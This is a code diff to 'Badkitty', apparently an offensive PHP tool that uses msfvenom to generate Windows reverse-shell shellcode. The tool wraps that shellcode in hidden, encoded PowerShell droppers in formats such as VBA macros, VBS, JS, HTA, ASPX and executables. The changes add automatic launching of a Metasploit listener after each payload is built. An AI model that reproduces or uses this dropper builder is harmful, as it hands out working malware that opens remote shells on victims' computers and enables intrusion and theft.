@@ -9,7 +9,7 @@ echo "\e[96m   \ \ \L\ \/\ \L\.\_/\ \L\ \ \ \\`\\ \ \ \ \_\ \ \_\ \ \_\ \   \e[0
 echo "\e[96m    \ \____/\ \__/.\_\ \___,_\ \_\ \_\ \_\ \__\\ \__\\/`____ \  \e[0m \n";
 echo "\e[96m     \/___/  \/__/\/_/\/__,_ /\/_/\/_/\/_/\/__/ \/__/ `/___/> \ \e[0m \n";
 echo "\e[96m                                                       /\____ / \e[0m \n";
-echo "\e[96m                                                       \/____/  \e[0m \n";
+echo "\e[96m                                                       \/____/  \e[0m \n\n";
 echo "\e[92m\e[1m +-- -- +=[ Script Name : Badkitty | Author: Ay@nSul | Cyber2kidds@gmail.com\e[0m\n";     
 echo "\e[92m\e[1m +-- -- +=[ Available Format : vba , vbs , exe , java , js , php , hta , cfm , aspx , cmd , raw\e[0m\n";
 echo "\e[92m\e[1m +-- -- +=[ PHP! 3meth \e[0m\n\n";
@@ -80,7 +80,7 @@ function generate_shell(){
 		$a = "set LHOST ".$lhost."\n";
 		$b = "set PAYLOAD ".$lpayload."\n";
 		$c = "set LPORT ".$lport."\n";
-		$d = "exploit -j";
+		$d = "exploit";
 		fwrite($mf, $v);
 		fwrite($mf, $b);
 		fwrite($mf, $a);
@@ -89,7 +89,7 @@ function generate_shell(){
 		fclose($mf);
 	}
 	
-	echo "\n\e[91mGenerating Payload\e[0m . . .";
+	echo "\n\e[91mGenerating Payload\e[0m . . .\n";
 	system("msfvenom -p {$lpayload} LHOST={$lhost} LPORT={$lport} --arch x86 --platform windows --smallest -f raw > raw_shellcode.txt");
 	$ascar = array();
 	$hxar = array();
@@ -169,7 +169,6 @@ End Sub'."\n";
 echo "\e[96m".$vba."\e[0m\n";
 
 	if(file_exists("meta.rc")){
-		system("service postgresql start");
 		system("msfconsole -r meta.rc");
 		system("rm meta.rc");
 	}else{
@@ -215,6 +214,13 @@ if ($exe_arch == "32"){
 system("rm c_file_temp.c");
 echo "kitty_.exe created!\n";
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
+
+if(file_exists("meta.rc")){
+		system("msfconsole -r meta.rc");
+		system("rm meta.rc");
+	}else{
+		die();
+	}
 }
 ###########################JAVA ENCODE#############################
 elseif($lencode == "java"){
@@ -242,6 +248,12 @@ Process s;
 echo $java;
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
+if(file_exists("meta.rc")){
+		system("msfconsole -r meta.rc");
+		system("rm meta.rc");
+	}else{
+		die();
+	}
 }
 ############################JS ENCODE#############################
 elseif($lencode =="js"){
@@ -254,6 +266,12 @@ objShell.run("powershell -nop -win Hidden -noni -enc '.$powershell_encoded.'", 0
 echo $js;
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
+if(file_exists("meta.rc")){
+		system("msfconsole -r meta.rc");
+		system("rm meta.rc");
+	}else{
+		die();
+	}
 }
 ###########################PHP ENCODE#############################
 elseif($lencode =="php"){
@@ -267,6 +285,12 @@ system("cmd.exe /c powershell -nop -win Hidden -noni -enc'.$powershell_encoded.'
 echo $php;
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
+if(file_exists("meta.rc")){
+		system("msfconsole -r meta.rc");
+		system("rm meta.rc");
+	}else{
+		die();
+	}
 }
 ###########################HTA ENCODE#############################
 elseif($lencode =="hta"){
@@ -289,6 +313,12 @@ $hta = '<html>
 echo $hta;
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
+if(file_exists("meta.rc")){
+		system("msfconsole -r meta.rc");
+		system("rm meta.rc");
+	}else{
+		die();
+	}
 }
 ###########################CFM ENCODE#############################
 elseif($lencode == "cfm"){
@@ -303,6 +333,12 @@ $cfm = '<cfexecute name = "C:\\Windows\\System32\\cmd.exe"
 echo $cfm;
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
+if(file_exists("meta.rc")){
+		system("msfconsole -r meta.rc");
+		system("rm meta.rc");
+	}else{
+		die();
+	}
 }
 ###########################ASPX ENCODE#############################
 elseif($lencode =="aspx"){
@@ -324,6 +360,12 @@ $aspx = '
 echo $aspx;
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
+if(file_exists("meta.rc")){
+		system("msfconsole -r meta.rc");
+		system("rm meta.rc");
+	}else{
+		die();
+	}
 }
 ###########################CMD ENCODE#############################
 elseif($lencode =="cmd"){
@@ -331,6 +373,13 @@ elseif($lencode =="cmd"){
  $powershell_encoded = generate_shell();
     echo "powershell -nop -win Hidden -noni -enc ".$powershell_encoded;
 	echo "\n\e[101m\e[97mHappy Hack :)!\e[0m\n";
+
+if(file_exists("meta.rc")){
+		system("msfconsole -r meta.rc");
+		system("rm meta.rc");
+	}else{
+		die();
+	}
 }
 ###########################RAW ENCODE#############################
 elseif($lencode == "raw"){
@@ -338,6 +387,13 @@ elseif($lencode == "raw"){
 $powershell_encoded = generate_shell();
     echo $powershell_encoded;
 	echo "\n\e[101m\e[97mHappy Hack :)!\e[0m\n";
+
+if(file_exists("meta.rc")){
+		system("msfconsole -r meta.rc");
+		system("rm meta.rc");
+	}else{
+		die();
+	}
 }
 ######################VBS_ENCODE###############################
 elseif($lencode =="vbs"){
@@ -349,6 +405,13 @@ objShell.Run "powershell -nop -win Hidden -noni -enc '.$powershell_encoded.'", 0
 
 echo $vbs;
 echo "\n\e[101m\e[97mHappy Hack :)!\e[0m\n";
+
+if(file_exists("meta.rc")){
+		system("msfconsole -r meta.rc");
+		system("rm meta.rc");
+	}else{
+		die();
+	}
 
 }else{
 	die("Unknown Format!\n");
